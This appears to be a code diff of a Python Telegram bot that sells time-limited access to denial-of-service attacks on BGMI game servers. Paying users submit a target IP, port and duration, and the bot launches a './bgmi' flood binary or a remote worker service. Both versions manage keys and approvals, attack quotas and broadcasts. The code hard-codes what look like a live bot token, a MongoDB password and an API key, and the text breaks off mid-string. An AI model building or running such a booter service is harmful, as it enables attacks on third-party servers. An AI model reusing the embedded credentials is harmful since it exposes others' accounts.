@@ -1,341 +1,494 @@
 import os
-import datetime
+import re
 import subprocess
+import telebot
+from threading import Timer
 import time
-from telebot import TeleBot
-from requests.exceptions import ReadTimeout
+import ipaddress
+import logging
+import random
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InputFile
+from datetime import datetime, timedelta
+import pytz
+import requests
+from collections import defaultdict
+from pymongo import MongoClient
 
-# Admin user IDs
-ADMIN_IDS = ["5113311276"]
 
-# Verified group IDs
-VERIFIED_GROUP_IDS = ["2208074827"]  # Replace with your group ID
+# MongoDB setup
+MONGO_URI = "mongodb+srv://lm6000k:IBRSupreme@ibrdata.uo83r.mongodb.net/"
+client = MongoClient(MONGO_URI)
 
-# File to store allowed user IDs and keys with expiration dates
-KEY_FILE = "keys.txt"
+# Database and collection
+db = client['action']  # Replace 'action' with your database name if different
+actions_collection = db['action']  # 'action' is the collection name
 
-# File to store command logs
-LOG_FILE = "log.txt"
+# Initialize logging for better monitoring
+logging.basicConfig(filename='bot_actions.log', level=logging.INFO, 
+                    format='%(asctime)s - %(message)s')
 
-# Timeout for API requests
-TIMEOUT = 130
+# Initialize the bot with the token from environment variables
+TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+if not TOKEN:
+    raise ValueError("Please set your bot token in the environment variables!")
 
-# Bot initialization (replace 'YOUR_BOT_TOKEN' with your actual bot token)
-bot = TeleBot('7598705419:AAG-Viaz5i5bdcMozeIPAk9X9AmAxrR_lbw')
-# Constants for attack limits
-MAX_ATTACKS_PER_DAY = 5
+bot = telebot.TeleBot(TOKEN)
 
-COOLDOWN_TIME = 2  # Cooldown time between attacks in seconds
-# Function to read keys and their expiration dates from the file
-def read_keys():
-    allowed_keys = {}
-    if os.path.exists(KEY_FILE):
-        with open(KEY_FILE, "r") as file:
-            for line in file:
-                line = line.strip()
-                if line:
-                    try:
-                        key, expiry_date = line.split(maxsplit=1)
-                        allowed_keys[key] = datetime.datetime.strptime(expiry_date, "%Y-%m-%d").date()
-                    except ValueError:
-                        print(f"Ignoring invalid line in keys.txt: {line}")
-    return allowed_keys
+# Timezone for Kolkata (GMT +5:30)
+kolkata_tz = pytz.timezone('Asia/Kolkata')
 
-# List to store allowed keys
-allowed_keys = read_keys()
+# File to store authorizations
+AUTHORIZATION_FILE = 'authorizations.txt'
 
-# Function to log command to the file
-def log_command(user_id, target, port, duration):
-    user_info = bot.get_chat(user_id)
-    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
+# List of authorized users (initially empty, to be loaded from file)
+authorized_users = {}
 
-# Function to clear logs
-def clear_logs():
-    if os.path.exists(LOG_FILE):
-        with open(LOG_FILE, "w") as file:
-            file.truncate(0)
-        return "Logs cleared successfully"
-    return "No logs found to clear."
+# List of authorized user IDs (admins)
+AUTHORIZED_USERS = [6800732852]
 
-# Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, duration=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
-    if port:
-        log_entry += f" | Port: {port}"
-    if duration:
-        log_entry += f" | Time: {duration}"
+# Regex pattern to match the IP, port, and duration
+pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d+)")
 
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
+# Dictionary to keep track of subprocesses and timers
+processes = {}
 
-# Function to send message with retries
-def send_message_with_retry(chat_id, text, retries=3):
-    for attempt in range(retries):
+# Dictionary to store user modes (manual or auto)
+user_modes = {}
+
+# Store supporter mode status for users
+supporter_users = {}
+
+# Store processes and temporary data for each user
+processes = defaultdict(dict)
+
+# Dictionary to track actions by user
+active_users = {}  # Format: {user_id: {"username": str, "action": str, "process": subprocess, "expire_time": datetime}}
+# Authorize a user and set expiration in Kolkata timezone
+def authorize_user(user_id, expire_time):
+    # Convert expire_time to UTC for storing in MongoDB
+    expire_time_utc = expire_time.astimezone(pytz.utc)
+    
+    # Update or insert the user's authorization into MongoDB
+    actions_collection.update_one(
+        {'user_id': user_id},
+        {
+            '$set': {
+                'status': 'authorized',
+                'expire_time': expire_time_utc
+            }
+        },
+        upsert=True
+    )
+
+# Save authorizations to MongoDB with Kolkata timezone handling
+def save_authorizations():
+    for user_id, info in authorized_users.items():
+        # Convert expire_time to Kolkata timezone
+        expire_time_kolkata = info['expire_time'].astimezone(kolkata_tz)
+        
+        # Convert Kolkata time to UTC for MongoDB storage
+        expire_time_utc = expire_time_kolkata.astimezone(pytz.utc)
+        
+        # Upsert user information (update if exists, insert if new)
+        actions_collection.update_one(
+            {'user_id': user_id}, 
+            {
+                '$set': {
+                    'status': info['status'],
+                    'expire_time': expire_time_utc
+                }
+            },
+            upsert=True
+        )
+
+def load_authorizations():
+    global authorized_users
+    authorized_users = {}
+
+    # Fetch all users from MongoDB with "authorized" status
+    users = actions_collection.find({"status": "authorized"})
+    for user in users:
+        user_id = str(user['user_id'])  # Ensure user_id is a string for consistency
+        
+        # Get the expire_time from MongoDB
+        expire_time_str = user.get('expire_time')
+        if not expire_time_str:
+            logging.warning(f"No expire_time found for user {user_id}")
+            continue
+
+        # Ensure that the expire_time is a string before proceeding
+        if not isinstance(expire_time_str, str):
+            logging.error(f"expire_time is not a string for user {user_id}, got: {expire_time_str}")
+            continue
+
+        # Parse expire_time and handle potential conversion issues
         try:
-            bot.send_message(chat_id, text)
-            break
-        except ReadTimeout:
-            if attempt < retries - 1:
-                time.sleep(2)
-            else:
-                bot.send_message(chat_id, "Failed to send message after several attempts.")
+            # Using dateutil.parser for more robust parsing of ISO strings
+            expire_time_utc = parser.isoparse(expire_time_str).astimezone(pytz.UTC)
+            
+            # Convert UTC time to Kolkata timezone
+            expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
+            
+            # Replace the user's expire_time with the converted Kolkata time
+            user['expire_time'] = expire_time_kolkata
+        except (ValueError, TypeError) as e:
+            logging.error(f"Failed to parse expire_time for user {user_id}: {e}")
+            continue  # Skip this user if there's an error in parsing
 
-# Function to get group admins
-def get_group_admins(chat_id):
+        # Add the user to the authorized_users dictionary
+        authorized_users[user_id] = user
+
+    logging.info(f"Loaded {len(authorized_users)} authorized users with expiration times.")
+
+def broadcast_message_to_all(message):
+    """Function to broadcast a message to all users in the bot's user base."""
+    all_users = actions_collection.find({}, {"user_id": 1})  # Assuming user_id is stored in MongoDB
+    for user in all_users:
+        try:
+            bot.send_message(user['user_id'], message)
+        except Exception as e:
+            logging.error(f"Failed to send message to user {user['user_id']}: {str(e)}")
+          
+# Check if a user is authorized and their authorization hasn't expired
+def is_authorized(user_id):
+    user_info = actions_collection.find_one({'user_id': user_id})
+    
+    if user_info and user_info['status'] == 'authorized':
+        now = datetime.now(kolkata_tz)
+        expire_time = user_info['expire_time'].astimezone(kolkata_tz)
+        if now < expire_time:
+            return True
+        else:
+            # Authorization expired
+            actions_collection.update_one(
+                {'user_id': user_id},
+                {'$set': {'status': 'expired'}}
+            )
+    return False
+
+# Helper function to notify admins of a new authorization request
+def notify_admins(user_id, username):
+    message = (
+        f"🔔 *New Authorization Request*\n\n"
+        f"👤 User: @{username} (ID: {user_id})\n"
+        f"⏳ Please approve or reject the request."
+    )
+    for admin_id in AUTHORIZED_USERS:
+        bot.send_message(admin_id, message, parse_mode='Markdown')
+
+# Validate IP
+def is_valid_ip(ip):
     try:
-        admins = bot.get_chat_administrators(chat_id)
-        return [admin.user.id for admin in admins]
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+# Validate port
+def is_valid_port(port):
+    return 1 <= int(port) <= 65535
+
+# Validate duration
+def is_valid_duration(duration):
+    return int(duration) > 0 and int(duration) <= 600  # max 600 seconds (10 minutes)
+
+# Periodically check for expired authorizations
+def check_expired_users():
+    now_kolkata = datetime.now(kolkata_tz)
+    now_utc = now_kolkata.astimezone(pytz.utc)
+
+    expired_users = actions_collection.find({
+        'status': 'authorized',
+        'expire_time': {'$lte': now_utc}
+    })
+
+    for user in expired_users:
+        user_id = user['user_id']
+        bot.send_message(user_id, "⛔ *Your access has expired! Please renew your access.*", parse_mode='Markdown')
+        
+        # Update user's status to 'expired' in MongoDB
+        actions_collection.update_one(
+            {'user_id': user_id},
+            {'$set': {'status': 'expired'}}
+        )
+
+    # Check again after 15 minutes
+    Timer(900, check_expired_users).start()
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    # Create the button markup
+    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    manual_button = KeyboardButton('Manual Mode')
+    auto_button = KeyboardButton('Auto Mode')
+    markup.add(manual_button, auto_button)
+
+    welcome_text = (
+        "👋 *Hey there! Welcome to Action Bot!*\n\n"
+        "I'm here to help you manage actions easily and efficiently. 🚀\n\n"
+        "🔹 To *start* an action, you can choose between:\n"
+        "1. Manual Mode: Enter IP, port, and duration manually.\n"
+        "2. Auto Mode: Enter IP and port, and I'll choose a random duration for you.\n\n"
+        "🔹 Want to *stop* all ongoing actions? Just type:\n"
+        "stop all\n\n"
+        "🔐 *Important:* Only authorized users can use this bot in private chat. 😎\n\n"
+        "🤖 _This bot was made by Ibr._"
+    )
+    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)
+
+# Mode selection handler
+@bot.message_handler(func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
+def set_mode(message):
+    user_id = message.from_user.id
+    selected_mode = message.text.lower().split()[0]  # 'manual' or 'auto'
+    
+    # Update the user's mode
+    user_modes[user_id] = selected_mode
+    bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*")
+    
+# Command to show the list of active users and actions (admin only)
+@bot.message_handler(commands=['list_active'])
+def list_active_users(message):
+    user_id = message.from_user.id
+    if user_id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ You are not authorized to view the active users.", parse_mode='Markdown')
+        return
+
+    if not active_users:
+        bot.reply_to(message, "⚠️ No active users at the moment.", parse_mode='Markdown')
+        return
+
+    active_list = "🟢 *Active Users and Actions:*\n"
+    for uid, info in active_users.items():
+        action = info.get("action", "Unknown action")
+        active_list += f"👤 User: {info['username']} (ID: {uid})\n🔹 Action: {action}\n\n"
+
+    bot.reply_to(message, active_list, parse_mode='Markdown')
+
+@bot.message_handler(commands=['approve'])
+def approve_user(message):
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to approve users.*", parse_mode='Markdown')
+        return
+    
+    try:
+        # Command format: /approve <user_id> <duration>
+        _, user_id, duration = message.text.split()
+        user_id = int(user_id)
+
+        now = datetime.now(kolkata_tz)
+        expire_time = None
+        
+        # Custom duration parsing
+        time_match = re.match(r"(\d+)([dhm])", duration)
+        if time_match:
+            value, unit = time_match.groups()
+            value = int(value)
+            if unit == 'h':
+                expire_time = now + timedelta(hours=value)
+            elif unit == 'd':
+                expire_time = now + timedelta(days=value)
+            elif unit == 'm':
+                expire_time = now + timedelta(days=30 * value)
+        elif duration == 'permanent':
+            expire_time = now + timedelta(days=365*100)  # 100 years for permanent
+        
+        if expire_time:
+            # Save to MongoDB using the authorize_user function
+            authorize_user(user_id, expire_time)
+
+            bot.reply_to(message, f"✅ *User {user_id} has been authorized for {duration}!* 🎉", parse_mode='Markdown')
+            bot.send_message(user_id, "🎉 *You are now authorized to use the bot! Enjoy!* 🚀", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} approved user {user_id} for {duration}")
+        else:
+            bot.reply_to(message, "❌ *Invalid duration format!* Please use 'Xd', 'Xh', 'Xm', or 'permanent'.", parse_mode='Markdown')
+
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/approve <user_id> <duration>`.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['reject'])
+def reject_user(message):
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to reject users.*", parse_mode='Markdown')
+        return
+
+    try:
+        _, user_id = message.text.split()
+        user_id = int(user_id)
+        
+        if user_id in authorized_users and authorized_users[user_id]['status'] == 'pending':
+            authorized_users[user_id]['status'] = 'rejected'
+            save_authorizations()
+            bot.reply_to(message, f"🛑 *User {user_id}'s application has been rejected.*", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} rejected user {user_id}'s application.")
+
+            # Notify the user that their application was rejected
+            bot.send_message(user_id, "❌ *Your authorization request has been declined by the admin.*", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"⚠️ *User {user_id} has no pending application.*", parse_mode='Markdown')
+
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/reject <user_id>`.", parse_mode='Markdown')
+
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to remove users.*", parse_mode='Markdown')
+        return
+
+    try:
+        _, user_id = message.text.split()
+        user_id = int(user_id)
+        
+        if user_id in authorized_users:
+            del authorized_users[user_id]
+            save_authorizations()
+            bot.reply_to(message, f"🚫 *User {user_id} has been removed from the authorization list.*", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
+            # Notify the user that their application was rejected
+            bot.send_message(user_id, "❌ *Your access has been removed by the admin.* Please contact to the provider for more information", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"⚠️ *User {user_id} is not in the authorization list.*", parse_mode='Markdown')
+
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/remove <user_id>`.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['auth'])
+def request_authorization(message):
+    user_id = message.from_user.id
+    username = message.from_user.username if message.from_user.username else 'Unknown'
+
+    # Check if the user is in the AUTHORIZED_USERS list (admins)
+    if user_id in AUTHORIZED_USERS:
+        bot.reply_to(message, "🎉 *You're already a trusted admin!* No need for authorization.", parse_mode='Markdown')
+        return
+
+    # Check if the user is already authorized and get their expiration time
+    user_info = actions_collection.find_one({'user_id': user_id})
+    
+    if user_info and user_info['status'] == 'authorized':
+        # Get and format expiration time in Kolkata timezone
+        expire_time_utc = user_info['expire_time']
+        expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
+        expire_time_str = expire_time_kolkata.strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Reply to the user with authorization status and expiration time
+        bot.reply_to(message, (
+            f"🎉 *You're already authorized to use the bot!*\n\n"
+            f"⏳ *Your authorization expires on:* {expire_time_str} (Asia/Kolkata time)"
+        ), parse_mode='Markdown')
+        return
+    
+    # If the user is not authorized, request authorization
+    bot.reply_to(message, (
+        f"🔒 *Authorization Requested!* Please wait for the admin to approve your request.\n\n"
+        f"👤 Your user ID: {user_id}\n"
+        f"👤 Username: @{username}\n\n"
+        "An admin will review your request soon. 🙌"
+    ), parse_mode='Markdown')
+
+    # Notify all admins of the authorization request
+    notify_admins(user_id, username)
+
+    # Log the authorization request
+    logging.info(f"User {user_id} ({username}) requested authorization")
+
+
+@bot.message_handler(commands=['worker'])
+def get_worker_status(message):
+    """Fetch the status of workers from the server."""
+    try:
+        response = requests.get(
+            'https://lm6000k.pythonanywhere.com/status',
+            headers={'API-Key': 'fukbgmiservernow'}  # Your API key
+        )
+        if response.status_code == 200:
+            worker_status = response.json()
+            online_workers = worker_status.get('online_workers', [])
+            bot.reply_to(message, "✅ *Worker List!* {online_workers}.", parse_mode='Markdown')
+            return online_workers
+        else:
+            bot.reply_to(message, f"Failed to fetch worker status. Status code: {response.status_code}, Response: {response.text}")
+            return []
     except Exception as e:
-        print(f"Error fetching group admins: {str(e)}")
+        bot.reply_to(message, f"Error fetching worker status: {e}")
         return []
 
-# Function to check if user is admin
-def is_user_admin(chat_id, user_id):
-    if str(user_id) in ADMIN_IDS:
-        return True
-    group_admins = get_group_admins(chat_id)
-    return user_id in group_admins
-
-# Function to check if user has a valid key
-def has_valid_key(user_id):
-    return str(user_id) in allowed_keys
-
-# Function to check if key is expired
-def is_key_expired(user_id):
-    today = datetime.date.today()
-    expiry_date = allowed_keys.get(str(user_id))
-    if expiry_date:
-        expiry_date = datetime.datetime.strptime(expiry_date, "%Y-%m-%d").date()
-        return today > expiry_date
-    return True
-
-# Function to track user attacks
-user_attacks = {}
-
-def track_attack(user_id):
-    today = datetime.date.today()
-    if user_id not in user_attacks:
-        user_attacks[user_id] = {}
-    if today not in user_attacks[user_id]:
-        user_attacks[user_id][today] = 0
-    user_attacks[user_id][today] += 1
-
-def can_attack(user_id):
-    today = datetime.date.today()
-    if user_id in user_attacks and today in user_attacks[user_id]:
-        return user_attacks[user_id][today] < MAX_ATTACKS_PER_DAY
-    return True
-
-# Command handlers
-@bot.message_handler(commands=['addkey'])
-def add_key(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        command = message.text.split()
-        if len(command) > 2:
-            key_to_add = command[1]
-            expiry_date = command[2]
-            try:
-                datetime.datetime.strptime(expiry_date, "%Y-%m-%d")
-                if key_to_add not in allowed_keys:
-                    allowed_keys[key_to_add] = expiry_date
-                    with open(KEY_FILE, "a") as file:
-                        file.write(f"{key_to_add} {expiry_date}\n")
-                    response = f"Key {key_to_add} added successfully with expiry date {expiry_date}."
-                else:
-                    response = "Key already exists."
-            except ValueError:
-                response = "Invalid date format. Please use YYYY-MM-DD."
+@bot.message_handler(commands=['yell'])
+def handle_yell(message):
+    user_id = message.from_user.id
+    if user_id in AUTHORIZED_USERS:
+        broadcast_message = message.text.replace("/yell", "", 1).strip()
+        if broadcast_message:
+            broadcast_message_to_all(broadcast_message)
+            bot.reply_to(message, "Message broadcasted successfully.")
         else:
-            response = "Please specify a key and an expiration date (YYYY-MM-DD) to add."
-        bot.reply_to(message, response)
+            bot.reply_to(message, "Please provide a message to broadcast.")
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
+      
+@bot.message_handler(commands=['supporter_mode'])
+def activate_supporter_mode(message):
+    user_id = message.from_user.id
+    supporter_users[user_id] = True  # Activate supporter mode for the user
+    bot.reply_to(message, "✅ *Supporter mode activated!* Your actions will now be handled by the worker service.", parse_mode='Markdown')
 
-@bot.message_handler(commands=['removekey'])
-def remove_key(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        command = message.text.split()
-        if len(command) > 1:
-            key_to_remove = command[1]
-            if key_to_remove in allowed_keys:
-                del allowed_keys[key_to_remove]
-                with open(KEY_FILE, "w") as file:
-                    for key, expiry_date in allowed_keys.items():
-                        file.write(f"{key} {expiry_date}\n")
-                response = f"Key {key_to_remove} removed successfully."
-            else:
-                response = f"Key {key_to_remove} not found in the list."
-        else:
-            response = "Please specify a key to remove. Usage: /removekey <key>"
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
+@bot.message_handler(commands=['disable_supporter_mode'])
+def disable_supporter_mode(message):
+    user_id = message.from_user.id
+    supporter_users[user_id] = False  # Deactivate supporter mode for the user
+    bot.reply_to(message, "✅ *Supporter mode deactivated!* Your actions will be handled locally.", parse_mode='Markdown')
 
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        response = clear_logs()
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
+# Main message handler
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    user_id = message.from_user.id
+    chat_type = message.chat.type
 
-@bot.message_handler(commands=['allkeys'])
-def show_all_keys(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        if allowed_keys:
-            response = "Authorized Keys and Expiration Dates:\n"
-            for key, expiry_date in allowed_keys.items():
-                response += f"- Key: {key}, Expires on: {expiry_date}\n"
-        else:
-            response = "No keys found."
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                bot.reply_to(message, "No data found.")
-        else:
-            bot.reply_to(message, "No data found.")
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
-    response = f"Your ID: {user_id}"
-    bot.reply_to(message, response)
-
-# Function to handle the reply when users run the /bgmi command
-def start_attack_reply(message, target, port, duration):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    
-    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {duration} Seconds\nMethod: BGMI"
-    bot.reply_to(message, response)
-
-# Dictionary to store the last time each user ran the /bgmi command
-bgmi_cooldown = {}
-
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    user_id = str(message.chat.id)
-    is_admin = is_user_admin(message.chat.id, message.from_user.id)
-
-    if user_id not in VERIFIED_GROUP_IDS and not (is_admin or has_valid_key(user_id)):
-        bot.reply_to(message, "You need a valid key to use this command. Please activate by entering a valid key.")
+    # Skip authorization check if the user is in the AUTHORIZED_USERS list
+    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
+        bot.reply_to(message, '⛔ *You are not authorized to use this bot.* Please send /auth to request access. 🤔\n\n_This bot was made by Ibr._', parse_mode='Markdown')
         return
 
-    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-        response = "You are on cooldown. Please wait before running the /bgmi command again."
-        bot.reply_to(message, response)
+    text = message.text.strip().lower()
+
+    # Check if the user wants to stop an ongoing action
+    if text == 'stop action':
+        stop_user_process(user_id, message)
         return
 
-    if not is_admin and not can_attack(user_id):
-        bot.reply_to(message, "You have reached the maximum number of attacks for today.")
+    user_mode = user_modes.get(user_id, 'manual')  # Default to 'manual' if mode not set
+
+    if text == 'stop all':
+        stop_all_actions(message)
         return
 
-    bgmi_cooldown[user_id] = datetime.datetime.now()
-    track_attack(user_id)
-    
-    command = message.text.split()
-    if len(command) == 4:
-        target = command[1]
-        port = int(command[2])
-        duration = int(command[3])
-        if duration > 5000:
-            response = "Error: Time interval must be less than 5000."
-        else:
-            record_command_logs(user_id, '/bgmi', target, port, duration)
-            log_command(user_id, target, port, duration)
-            start_attack_reply(message, target, port, duration)
-            full_command = f"./bgmi {target} {port} {duration} 40"
-            subprocess.run(full_command, shell=True)
-            response = f"BGMI attack finished. Target: {target} Port: {port} Time: {duration}"
-    else:
-        response = "Usage: /bgmi <target> <port> <time>"
-    
-    bot.reply_to(message, response)
+    # Regex to match "<ip> <port> <duration>" for manual mode or "<ip> <port>" for auto mode
+    auto_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})")
+    manual_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d{1,4})")
 
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
-    if has_valid_key(user_id) or is_user_admin(message.chat.id, message.from_user.id):
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = "No command logs found for you."
-        except FileNotFoundError:
-            response = "No command logs found."
-    else:
-        response = "You are not authorized to use this command."
-    bot.reply_to(message, response)
+    if user_mode == 'auto':
+        # Auto mode logic
+        match = auto_mode_pattern.match(text)
+        if match:
+            ip, port = match.groups()
+            duration = random.randint(80, 120)  # Random duration for auto mode
 
-@bot.message_handler(commands=['admincmd'])
-def show_admin_commands(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        help_text = '''Admin commands:
-/addkey <key> <expiry_date>: Add a key with expiration date (YYYY-MM-DD)
-/removekey <key>: Remove a key.
-/allkeys: Authorized keys list.
-/logs: All users logs.
-/broadcast: Broadcast a message.
-/clearlogs: Clear the logs file.
-'''
-        bot.reply_to(message, help_text)
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
+            # Validate IP and Port
+            if not is_valid_ip(ip):
+                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+            if not is_valid_port(port):
+                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    if is_user_admin(message.chat.id, message.from_user.id):
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "Message to all users by admin:\n\n" + command[1]
-            with open(KEY_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        send_message_with_retry(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast message sent successfully to all users."
-        else:
-            response = "Please provide a message to broadcast."
-        bot.reply_to(message, response)
-    else:
-        bot.reply_to(message, "You are not authorized to use this command.")
+            # Show the stop action button
+            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+            stop_button = KeyboardButton('Stop Action')
+            markup.add(stop_button)
 
-@bot.message_handler(commands=['activate'])
-def activate_key(message):
-    user_id = str(message.chat.id)
-    command = message.text.split()
-    if len(command) > 1:
-        key_to_activate = command[1]
-        if key_to_activate in allowed_keys and not is_key_expired(key_to_activate):
-            allowed_keys[user_id] = allowed_keys[key_to_activate]
-            with open(KEY_FILE, "w") as file:
-                for key, expiry_date in allowed_keys.items():
-                    file.write(f"{key} {expiry_date}\n")
-            response = "Your key has been activated successfully."
-        else:
-            response = "Invalid or expired key."
-    else:
-        response = "Usage: /activate <key>"
-    bot.reply_to(message, response)
-
-bot.polling(none_stop=True, timeout=TIMEOUT)
+            # Respond to the user that the action is starting
+            bot.reply_to(message, (
+                f"🔧 *Got it! Starting action in Auto Mode...* 💥\n\n"
+                f"🌍 *Ta
